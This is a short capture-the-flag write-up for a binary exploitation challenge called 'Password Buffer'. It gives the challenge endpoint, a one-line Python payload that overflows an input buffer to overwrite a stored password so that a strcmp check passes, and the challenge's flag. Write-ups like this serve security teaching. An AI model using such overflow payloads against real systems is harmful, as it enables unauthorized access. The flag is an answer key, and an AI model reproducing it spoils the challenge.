# Password Buffer [pwn]

### Challenge:
I made a brand new password system. The system will generate new passwords before giving you the proper flag. However I seem to have miswritten it as the password I had is no longer in sync. Can you find that flag?

##### Links: ```nc chal.bearcatctf.io 32927```
##### Files: [challenge.zip](challenge.zip)

### Solution:
We can use the bof in the input to overwrite the password.

```py
r.sendline(b"A"*17+b"\x00" + b"A"*31)
```

This will overwrite the password with 17 A's while maintaining the null terminator, as to not break the strcmp check.

Flag: ```BCCTF{K1nDa_WI1d_p4w0Rd_Th3r3_601fd5b4}```